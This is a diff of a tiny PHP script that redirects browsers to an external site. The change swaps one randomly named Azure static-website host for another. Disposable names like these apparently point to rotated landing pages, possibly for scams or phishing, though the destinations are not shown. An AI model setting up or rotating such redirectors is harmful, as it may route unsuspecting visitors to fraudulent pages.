@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://gap2fix7659176core.z13.web.core.windows.net/");
+header("Location: https://bixx97fixx87cixx87fixx99.z5.web.core.windows.net/");
  
 exit;
 ?>
